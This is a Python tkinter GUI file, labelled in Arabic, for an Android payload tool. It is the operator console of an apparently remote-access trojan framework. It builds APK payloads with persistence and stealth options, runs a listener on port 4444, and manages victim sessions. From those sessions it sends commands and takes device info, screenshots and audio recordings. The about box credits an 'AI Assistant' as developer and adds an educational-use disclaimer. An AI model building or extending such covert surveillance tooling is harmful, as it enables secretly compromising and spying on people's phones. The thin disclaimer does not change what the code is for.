#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
الواجهة الرسومية الرئيسية
Main GUI Window
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import json
from datetime import datetime
from pathlib import Path
from utils.logger import Logger

class MainWindow:
    """الواجهة الرسومية الرئيسية"""
    
    def __init__(self, tool):
        self.tool = tool
        self.logger = Logger()
        self.root = tk.Tk()
        self.setup_window()
        self.create_widgets()
        self.setup_menu()
        
    def setup_window(self):
        """إعداد النافذة الرئيسية"""
        self.root.title("أداة بايلودات الأندرويد المتقدمة")
        self.root.geometry("1200x800")
        self.root.minsize(800, 600)
        
        # إعداد الألوان
        self.colors = {
            'bg': '#2b2b2b',
            'fg': '#ffffff',
            'button': '#4a4a4a',
            'button_hover': '#5a5a5a',
            'success': '#4caf50',
            'error': '#f44336',
            'warning': '#ff9800',
            'info': '#2196f3'
        }
        
        self.root.configure(bg=self.colors['bg'])
        
    def create_widgets(self):
        """إنشاء عناصر الواجهة"""
        # إنشاء notebook للتبويبات
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # تبويب إنشاء البايلود
        self.create_payload_tab()
        
        # تبويب الاستماع
        self.create_listener_tab()
        
        # تبويب إدارة الجلسات
        self.create_sessions_tab()
        
        # تبويب الإعدادات
        self.create_settings_tab()
        
        # تبويب السجل
        self.create_log_tab()
        
    def create_payload_tab(self):
        """إنشاء تبويب البايلود"""
        self.payload_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.payload_frame, text="📱 إنشاء البايلود")
        
        # إطار المعلومات الأساسية
        basic_frame = ttk.LabelFrame(self.payload_frame, text="المعلومات الأساسية")
        basic_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # اسم البايلود
        ttk.Label(basic_frame, text="اسم البايلود:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.payload_name_var = tk.StringVar(value="android_payload")
        ttk.Entry(basic_frame, textvariable=self.payload_name_var, width=30).grid(row=0, column=1, padx=5, pady=5)
        
        # عنوان IP
        ttk.Label(basic_frame, text="عنوان IP:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.lhost_var = tk.StringVar(value="192.168.1.100")
        ttk.Entry(basic_frame, textvariable=self.lhost_var, width=30).grid(row=1, column=1, padx=5, pady=5)
        
        # المنفذ
        ttk.Label(basic_frame, text="المنفذ:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.lport_var = tk.StringVar(value="4444")
        ttk.Entry(basic_frame, textvariable=self.lport_var, width=30).grid(row=2, column=1, padx=5, pady=5)
        
        # إطار الخيارات المتقدمة
        advanced_frame = ttk.LabelFrame(self.payload_frame, text="الخيارات المتقدمة")
        advanced_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # التشفير
        self.encryption_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="استخدام التشفير", variable=self.encryption_var).grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        
        # الثبات
        self.persistence_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="إضافة الثبات", variable=self.persistence_var).grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        # التخفي
        self.stealth_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(advanced_frame, text="وضع التخفي", variable=self.stealth_var).grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        
        # أزرار التحكم
        button_frame = ttk.Frame(self.payload_frame)
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(button_frame, text="إنشاء البايلود", command=self.create_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="عرض البايلودات", command=self.show_payloads).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="حذف بايلود", command=self.delete_payload).pack(side=tk.LEFT, padx=5)
        
        # منطقة النتائج
        self.payload_result = scrolledtext.ScrolledText(self.payload_frame, height=10)
        self.payload_result.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
    def create_listener_tab(self):
        """إنشاء تبويب الاستماع"""
        self.listener_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.listener_frame, text="👂 الاستماع")
        
        # إطار إعدادات الاستماع
        config_frame = ttk.LabelFrame(self.listener_frame, text="إعدادات الاستماع")
        config_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # عنوان IP
        ttk.Label(config_frame, text="عنوان IP:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.listener_host_var = tk.StringVar(value="0.0.0.0")
        ttk.Entry(config_frame, textvariable=self.listener_host_var, width=20).grid(row=0, column=1, padx=5, pady=5)
        
        # المنفذ
        ttk.Label(config_frame, text="المنفذ:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.listener_port_var = tk.StringVar(value="4444")
        ttk.Entry(config_frame, textvariable=self.listener_port_var, width=10).grid(row=0, column=3, padx=5, pady=5)
        
        # أزرار التحكم
        button_frame = ttk.Frame(self.listener_frame)
        button_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.start_button = ttk.Button(button_frame, text="بدء الاستماع", command=self.start_listener)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="إيقاف الاستماع", command=self.stop_listener, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        # حالة الاستماع
        self.listener_status = ttk.Label(self.listener_frame, text="غير متصل", foreground="red")
        self.listener_status.pack(pady=5)
        
        # منطقة السجل
        self.listener_log = scrolledtext.ScrolledText(self.listener_frame, height=15)
        self.listener_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
    def create_sessions_tab(self):
        """إنشاء تبويب الجلسات"""
        self.sessions_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.sessions_frame, text="👥 الجلسات")
        
        # إطار قائمة الجلسات
        sessions_list_frame = ttk.LabelFrame(self.sessions_frame, text="الجلسات النشطة")
        sessions_list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # شجرة الجلسات
        columns = ('ID', 'IP', 'Port', 'Status', 'Connected At')
        self.sessions_tree = ttk.Treeview(sessions_list_frame, columns=columns, show='headings', height=10)
        
        for col in columns:
            self.sessions_tree.heading(col, text=col)
            self.sessions_tree.column(col, width=100)
        
        # شريط التمرير
        sessions_scrollbar = ttk.Scrollbar(sessions_list_frame, orient=tk.VERTICAL, command=self.sessions_tree.yview)
        self.sessions_tree.configure(yscrollcommand=sessions_scrollbar.set)
        
        self.sessions_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        sessions_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # إطار الأوامر
        commands_frame = ttk.LabelFrame(self.sessions_frame, text="الأوامر")
        commands_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # حقل إدخال الأمر
        ttk.Label(commands_frame, text="الأمر:").pack(side=tk.LEFT, padx=5)
        self.command_var = tk.StringVar()
        command_entry = ttk.Entry(commands_frame, textvariable=self.command_var, width=50)
        command_entry.pack(side=tk.LEFT, padx=5)
        command_entry.bind('<Return>', lambda e: self.send_command())
        
        ttk.Button(commands_frame, text="إرسال", command=self.send_command).pack(side=tk.LEFT, padx=5)
        
        # أزرار إضافية
        extra_buttons = ttk.Frame(commands_frame)
        extra_buttons.pack(side=tk.RIGHT, padx=5)
        
        ttk.Button(extra_buttons, text="معلومات الجهاز", command=self.get_device_info).pack(side=tk.LEFT, padx=2)
        ttk.Button(extra_buttons, text="لقطة شاشة", command=self.take_screenshot).pack(side=tk.LEFT, padx=2)
        ttk.Button(extra_buttons, text="تسجيل صوت", command=self.record_audio).pack(side=tk.LEFT, padx=2)
        
        # منطقة النتائج
        self.command_result = scrolledtext.ScrolledText(self.sessions_frame, height=8)
        self.command_result.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
    def create_settings_tab(self):
        """إنشاء تبويب الإعدادات"""
        self.settings_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.settings_frame, text="⚙️ الإعدادات")
        
        # إطار إعدادات التشفير
        encryption_frame = ttk.LabelFrame(self.settings_frame, text="إعدادات التشفير")
        encryption_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(encryption_frame, text="إنشاء مفاتيح جديدة", command=self.generate_keys).pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(encryption_frame, text="تصدير المفاتيح", command=self.export_keys).pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(encryption_frame, text="استيراد المفاتيح", command=self.import_keys).pack(side=tk.LEFT, padx=5, pady=5)
        
        # إطار إعدادات عامة
        general_frame = ttk.LabelFrame(self.settings_frame, text="الإعدادات العامة")
        general_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # لغة الواجهة
        ttk.Label(general_frame, text="لغة الواجهة:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.language_var = tk.StringVar(value="ar")
        language_combo = ttk.Combobox(general_frame, textvariable=self.language_var, values=["ar", "en"], width=10)
        language_combo.grid(row=0, column=1, padx=5, pady=5)
        
        # مستوى السجل
        ttk.Label(general_frame, text="مستوى السجل:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.log_level_var = tk.StringVar(value="INFO")
        log_level_combo = ttk.Combobox(general_frame, textvariable=self.log_level_var, 
                                     values=["DEBUG", "INFO", "WARNING", "ERROR"], width=10)
        log_level_combo.grid(row=1, column=1, padx=5, pady=5)
        
        # إطار الإحصائيات
        stats_frame = ttk.LabelFrame(self.settings_frame, text="الإحصائيات")
        stats_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        self.stats_text = scrolledtext.ScrolledText(stats_frame, height=10)
        self.stats_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # تحديث الإحصائيات
        self.update_statistics()
        
    def create_log_tab(self):
        """إنشاء تبويب السجل"""
        self.log_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.log_frame, text="📋 السجل")
        
        # أزرار التحكم
        log_buttons = ttk.Frame(self.log_frame)
        log_buttons.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Button(log_buttons, text="تحديث", command=self.refresh_log).pack(side=tk.LEFT, padx=5)
        ttk.Button(log_buttons, text="مسح", command=self.clear_log).pack(side=tk.LEFT, padx=5)
        ttk.Button(log_buttons, text="حفظ", command=self.save_log).pack(side=tk.LEFT, padx=5)
        
        # منطقة السجل
        self.log_text = scrolledtext.ScrolledText(self.log_frame, height=20)
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # تحميل السجل
        self.refresh_log()
        
    def setup_menu(self):
        """إعداد القائمة"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # قائمة الملف
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="ملف", menu=file_menu)
        file_menu.add_command(label="تصدير الجلسات", command=self.export_sessions)
        file_menu.add_command(label="استيراد الجلسات", command=self.import_sessions)
        file_menu.add_separator()
        file_menu.add_command(label="خروج", command=self.root.quit)
        
        # قائمة الأدوات
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="أدوات", menu=tools_menu)
        tools_menu.add_command(label="تنظيف الجلسات القديمة", command=self.cleanup_sessions)
        tools_menu.add_command(label="إعادة تشغيل الخدمات", command=self.restart_services)
        
        # قائمة المساعدة
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="مساعدة", menu=help_menu)
        help_menu.add_command(label="حول", command=self.show_about)
        help_menu.add_command(label="الوثائق", command=self.show_docs)
        
    def create_payload(self):
        """إنشاء بايلود جديد"""
        try:
            name = self.payload_name_var.get()
            lhost = self.lhost_var.get()
            lport = int(self.lport_var.get())
            encryption = self.encryption_var.get()
            persistence = self.persistence_var.get()
            stealth = self.stealth_var.get()
            
            if not name or not lhost or not lport:
                messagebox.showerror("خطأ", "يرجى ملء جميع الحقول المطلوبة")
                return
            
            # إنشاء البايلود في thread منفصل
            def create_payload_thread():
                try:
                    result = self.tool.payload_generator.create_payload(
                        name=name,
                        lhost=lhost,
                        lport=lport,
                        encryption=encryption,
                        persistence=persistence,
                        stealth=stealth
                    )
                    
                    # عرض النتيجة في الواجهة
                    self.root.after(0, lambda: self.show_payload_result(result))
                    
                except Exception as e:
                    self.root.after(0, lambda: messagebox.showerror("خطأ", f"فشل في إنشاء البايلود: {e}"))
            
            threading.Thread(target=create_payload_thread, daemon=True).start()
            
        except ValueError:
            messagebox.showerror("خطأ", "يرجى إدخال رقم صحيح للمنفذ")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في إنشاء البايلود: {e}")
    
    def show_payload_result(self, result):
        """عرض نتيجة إنشاء البايلود"""
        self.payload_result.delete(1.0, tk.END)
        self.payload_result.insert(tk.END, f"✅ تم إنشاء البايلود بنجاح!\n\n")
        self.payload_result.insert(tk.END, f"📁 مسار APK: {result['apk_path']}\n")
        self.payload_result.insert(tk.END, f"📄 ملف التكوين: {result['config_path']}\n")
        self.payload_result.insert(tk.END, f"🔧 ملف التثبيت: {result['installer_path']}\n")
        self.payload_result.insert(tk.END, f"📖 ملف README: {result['readme_path']}\n\n")
        self.payload_result.insert(tk.END, "يمكنك الآن تثبيت البايلود على الجهاز المستهدف")
        
        messagebox.showinfo("نجح", "تم إنشاء البايلود بنجاح!")
    
    def show_payloads(self):
        """عرض قائمة البايلودات"""
        try:
            payloads = self.tool.payload_generator.list_payloads()
            
            self.payload_result.delete(1.0, tk.END)
            if payloads:
                self.payload_result.insert(tk.END, "📱 البايلودات المتاحة:\n\n")
                for payload in payloads:
                    self.payload_result.insert(tk.END, f"• {payload['name']} (ID: {payload['id']})\n")
                    self.payload_result.insert(tk.END, f"  IP: {payload['lhost']}:{payload['lport']}\n")
                    self.payload_result.insert(tk.END, f"  تاريخ الإنشاء: {payload['created_at']}\n")
                    self.payload_result.insert(tk.END, f"  التشفير: {'مفعل' if payload['encryption'] else 'معطل'}\n\n")
            else:
                self.payload_result.insert(tk.END, "لا توجد بايلودات متاحة")
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في عرض البايلودات: {e}")
    
    def delete_payload(self):
        """حذف بايلود"""
        try:
            payloads = self.tool.payload_generator.list_payloads()
            if not payloads:
                messagebox.showinfo("معلومات", "لا توجد بايلودات للحذف")
                return
            
            # إنشاء نافذة اختيار البايلود
            dialog = tk.Toplevel(self.root)
            dialog.title("حذف بايلود")
            dialog.geometry("400x300")
            
            # قائمة البايلودات
            listbox = tk.Listbox(dialog)
            listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
            
            for payload in payloads:
                listbox.insert(tk.END, f"{payload['name']} (ID: {payload['id']})")
            
            def delete_selected():
                selection = listbox.curselection()
                if selection:
                    selected_payload = payloads[selection[0]]
                    if messagebox.askyesno("تأكيد", f"هل تريد حذف البايلود '{selected_payload['name']}'؟"):
                        if self.tool.payload_generator.delete_payload(selected_payload['id']):
                            messagebox.showinfo("نجح", "تم حذف البايلود بنجاح")
                            dialog.destroy()
                            self.show_payloads()
                        else:
                            messagebox.showerror("خطأ", "فشل في حذف البايلود")
                else:
                    messagebox.showwarning("تحذير", "يرجى اختيار بايلود للحذف")
            
            ttk.Button(dialog, text="حذف", command=delete_selected).pack(pady=5)
            ttk.Button(dialog, text="إلغاء", command=dialog.destroy).pack(pady=5)
            
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في حذف البايلود: {e}")
    
    def start_listener(self):
        """بدء الاستماع"""
        try:
            host = self.listener_host_var.get()
            port = int(self.listener_port_var.get())
            
            if not host or not port:
                messagebox.showerror("خطأ", "يرجى ملء عنوان IP والمنفذ")
                return
            
            # بدء الاستماع في thread منفصل
            def start_listener_thread():
                try:
                    self.root.after(0, lambda: self.start_button.config(state=tk.DISABLED))
                    self.root.after(0, lambda: self.stop_button.config(state=tk.NORMAL))
                    self.root.after(0, lambda: self.listener_status.config(text="متصل", foreground="green"))
                    
                    self.tool.listener.start(host, port, self.tool.session_manager)
                    
                except Exception as e:
                    self.root.after(0, lambda: messagebox.showerror("خطأ", f"فشل في بدء الاستماع: {e}"))
                    self.root.after(0, lambda: self.start_button.config(state=tk.NORMAL))
                    self.root.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
                    self.root.after(0, lambda: self.listener_status.config(text="غير متصل", foreground="red"))
            
            threading.Thread(target=start_listener_thread, daemon=True).start()
            
        except ValueError:
            messagebox.showerror("خطأ", "يرجى إدخال رقم صحيح للمنفذ")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في بدء الاستماع: {e}")
    
    def stop_listener(self):
        """إيقاف الاستماع"""
        try:
            self.tool.listener.stop()
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.listener_status.config(text="غير متصل", foreground="red")
            self.log_message("تم إيقاف الاستماع")
        except Exception as e:
            messagebox.showerror("خطأ", f"فشل في إيقاف الاستماع: {e}")
    
    def send_command(self):
        """إرسال أمر للجلسة المحددة"""
        try:
            selection = self.sessions_tree.selection()
            if not selection:
                messagebox.showwarning("تحذير", "يرجى اختيار جلسة أولاً")
                return
            
            command = self.command_var.get()
            if not command:
                messagebox.showwarning("تحذير", "يرجى إدخال أمر")
                return
            
            # الحصول على معرف الجلسة
            item = self.sessions_tree.item(selection[0])
            session_id = item['values'][0]
            
            # إرسال الأمر
            if self.tool.listener.send_command(session_id, command):
                self.command_result.insert(tk.END, f"📤 تم إرسال الأمر: {command}\n")
                self.command_var.set("")
            else:
                messagebox.showerror("خطأ", "فشل في إرسال الأمر")
                
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في إرسال الأمر: {e}")
    
    def get_device_info(self):
        """الحصول على معلومات الجهاز"""
        try:
            selection = self.sessions_tree.selection()
            if not selection:
                messagebox.showwarning("تحذير", "يرجى اختيار جلسة أولاً")
                return
            
            item = self.sessions_tree.item(selection[0])
            session_id = item['values'][0]
            
            device_info = self.tool.session_manager.get_device_info(session_id)
            if device_info:
                self.command_result.insert(tk.END, f"📱 معلومات الجهاز للجلسة {session_id}:\n")
                for key, value in device_info.items():
                    self.command_result.insert(tk.END, f"  {key}: {value}\n")
                self.command_result.insert(tk.END, "\n")
            
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في الحصول على معلومات الجهاز: {e}")
    
    def take_screenshot(self):
        """التقاط لقطة شاشة"""
        try:
            selection = self.sessions_tree.selection()
            if not selection:
                messagebox.showwarning("تحذير", "يرجى اختيار جلسة أولاً")
                return
            
            item = self.sessions_tree.item(selection[0])
            session_id = item['values'][0]
            
            if self.tool.session_manager.take_screenshot(session_id):
                self.command_result.insert(tk.END, f"📸 تم طلب لقطة الشاشة من الجلسة {session_id}\n")
            else:
                messagebox.showerror("خطأ", "فشل في طلب لقطة الشاشة")
                
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في التقاط لقطة الشاشة: {e}")
    
    def record_audio(self):
        """تسجيل صوت"""
        try:
            selection = self.sessions_tree.selection()
            if not selection:
                messagebox.showwarning("تحذير", "يرجى اختيار جلسة أولاً")
                return
            
            item = self.sessions_tree.item(selection[0])
            session_id = item['values'][0]
            
            duration = tk.simpledialog.askinteger("مدة التسجيل", "مدة التسجيل بالثواني:", initialvalue=10, minvalue=1, maxvalue=300)
            if duration:
                if self.tool.session_manager.record_audio(session_id, duration):
                    self.command_result.insert(tk.END, f"🎤 تم طلب تسجيل الصوت لمدة {duration} ثانية من الجلسة {session_id}\n")
                else:
                    messagebox.showerror("خطأ", "فشل في طلب تسجيل الصوت")
                
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في تسجيل الصوت: {e}")
    
    def generate_keys(self):
        """إنشاء مفاتيح جديدة"""
        try:
            if self.tool.encryption_manager.generate_new_keys():
                messagebox.showinfo("نجح", "تم إنشاء المفاتيح بنجاح")
            else:
                messagebox.showerror("خطأ", "فشل في إنشاء المفاتيح")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في إنشاء المفاتيح: {e}")
    
    def export_keys(self):
        """تصدير المفاتيح"""
        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
            )
            if filename:
                if self.tool.encryption_manager.export_keys(filename):
                    messagebox.showinfo("نجح", "تم تصدير المفاتيح بنجاح")
                else:
                    messagebox.showerror("خطأ", "فشل في تصدير المفاتيح")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في تصدير المفاتيح: {e}")
    
    def import_keys(self):
        """استيراد المفاتيح"""
        try:
            filename = filedialog.askopenfilename(
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
            )
            if filename:
                if self.tool.encryption_manager.import_keys(filename):
                    messagebox.showinfo("نجح", "تم استيراد المفاتيح بنجاح")
                else:
                    messagebox.showerror("خطأ", "فشل في استيراد المفاتيح")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في استيراد المفاتيح: {e}")
    
    def update_statistics(self):
        """تحديث الإحصائيات"""
        try:
            stats = self.tool.session_manager.get_statistics()
            
            self.stats_text.delete(1.0, tk.END)
            self.stats_text.insert(tk.END, f"📊 الإحصائيات\n")
            self.stats_text.insert(tk.END, f"{'='*30}\n\n")
            self.stats_text.insert(tk.END, f"إجمالي الجلسات: {stats['total_sessions']}\n")
            self.stats_text.insert(tk.END, f"الجلسات النشطة: {stats['active_sessions']}\n")
            self.stats_text.insert(tk.END, f"إجمالي الأوامر: {stats['total_commands']}\n")
            self.stats_text.insert(tk.END, f"الملفات المحملة: {stats['files_downloaded']}\n")
            self.stats_text.insert(tk.END, f"الملفات المرفوعة: {stats['files_uploaded']}\n")
            self.stats_text.insert(tk.END, f"وقت التشغيل: {stats.get('uptime', 'غير محسوب')}\n")
            
        except Exception as e:
            self.logger.error(f"خطأ في تحديث الإحصائيات: {e}")
    
    def refresh_log(self):
        """تحديث السجل"""
        try:
            # قراءة ملف السجل
            log_file = Path("logs/app.log")
            if log_file.exists():
                with open(log_file, 'r', encoding='utf-8') as f:
                    log_content = f.read()
                
                self.log_text.delete(1.0, tk.END)
                self.log_text.insert(tk.END, log_content)
                self.log_text.see(tk.END)
            else:
                self.log_text.delete(1.0, tk.END)
                self.log_text.insert(tk.END, "لا يوجد سجل متاح")
                
        except Exception as e:
            self.logger.error(f"خطأ في تحديث السجل: {e}")
    
    def clear_log(self):
        """مسح السجل"""
        try:
            if messagebox.askyesno("تأكيد", "هل تريد مسح السجل؟"):
                self.log_text.delete(1.0, tk.END)
                # مسح ملف السجل
                log_file = Path("logs/app.log")
                if log_file.exists():
                    log_file.unlink()
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في مسح السجل: {e}")
    
    def save_log(self):
        """حفظ السجل"""
        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".log",
                filetypes=[("Log files", "*.log"), ("Text files", "*.txt"), ("All files", "*.*")]
            )
            if filename:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.log_text.get(1.0, tk.END))
                messagebox.showinfo("نجح", "تم حفظ السجل بنجاح")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في حفظ السجل: {e}")
    
    def log_message(self, message):
        """إضافة رسالة للسجل"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.listener_log.insert(tk.END, f"[{timestamp}] {message}\n")
        self.listener_log.see(tk.END)
    
    def show_about(self):
        """عرض معلومات حول التطبيق"""
        about_text = """
أداة بايلودات الأندرويد المتقدمة
الإصدار: 1.0.0

أداة متقدمة لإنشاء بايلودات الأندرويد وإدارة الجلسات
مع واجهة رسومية سهلة الاستخدام

المطور: AI Assistant
التاريخ: 2024

تحذير: هذه الأداة للأغراض التعليمية والاختبار الأمني فقط
        """
        messagebox.showinfo("حول", about_text)
    
    def show_docs(self):
        """عرض الوثائق"""
        messagebox.showinfo("الوثائق", "الوثائق متاحة في ملف README.md")
    
    def export_sessions(self):
        """تصدير الجلسات"""
        try:
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
            )
            if filename:
                if self.tool.session_manager.export_sessions(filename):
                    messagebox.showinfo("نجح", "تم تصدير الجلسات بنجاح")
                else:
                    messagebox.showerror("خطأ", "فشل في تصدير الجلسات")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في تصدير الجلسات: {e}")
    
    def import_sessions(self):
        """استيراد الجلسات"""
        try:
            filename = filedialog.askopenfilename(
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
            )
            if filename:
                count = self.tool.session_manager.import_sessions(filename)
                messagebox.showinfo("نجح", f"تم استيراد {count} جلسة")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في استيراد الجلسات: {e}")
    
    def cleanup_sessions(self):
        """تنظيف الجلسات القديمة"""
        try:
            days = tk.simpledialog.askinteger("تنظيف الجلسات", "عدد الأيام (افتراضي: 7):", initialvalue=7, minvalue=1)
            if days:
                count = self.tool.session_manager.cleanup_old_sessions(days)
                messagebox.showinfo("نجح", f"تم حذف {count} جلسة قديمة")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في تنظيف الجلسات: {e}")
    
    def restart_services(self):
        """إعادة تشغيل الخدمات"""
        try:
            if messagebox.askyesno("تأكيد", "هل تريد إعادة تشغيل الخدمات؟"):
                # إعادة تحميل الجلسات
                self.tool.session_manager.load_sessions()
                # تحديث الإحصائيات
                self.update_statistics()
                messagebox.showinfo("نجح", "تم إعادة تشغيل الخدمات")
        except Exception as e:
            messagebox.showerror("خطأ", f"خطأ في إعادة تشغيل الخدمات: {e}")
    
    def run(self):
        """تشغيل الواجهة الرسومية"""
        try:
            # تحديث الجلسات كل 5 ثواني
            def update_sessions():
                try:
                    sessions = self.tool.session_manager.get_all_sessions()
                    
                    # مسح الجدول
                    for item in self.sessions_tree.get_children():
                        self.sessions_tree.delete(item)
                    
                    # إضافة الجلسات
                    for session in sessions:
                        self.sessions_tree.insert('', 'end', values=(
                            session['id'],
                            session.get('ip', 'غير معروف'),
                            session.get('port', 'غير معروف'),
                            session.get('status', 'غير معروف'),
                            session.get('connected_at', 'غير معروف')
                        ))
                    
                    # تحديث الإحصائيات
                    self.update_statistics()
                    
                except Exception as e:
                    self.logger.error(f"خطأ في تحديث الجلسات: {e}")
                
                # جدولة التحديث التالي
                self.root.after(5000, update_sessions)
            
            # بدء التحديث
            update_sessions()
            
            # تشغيل الواجهة
            self.root.mainloop()
            
        except Exception as e:
            self.logger.error(f"خطأ في تشغيل الواجهة: {e}")
            messagebox.showerror("خطأ", f"خطأ في تشغيل الواجهة: {e}")
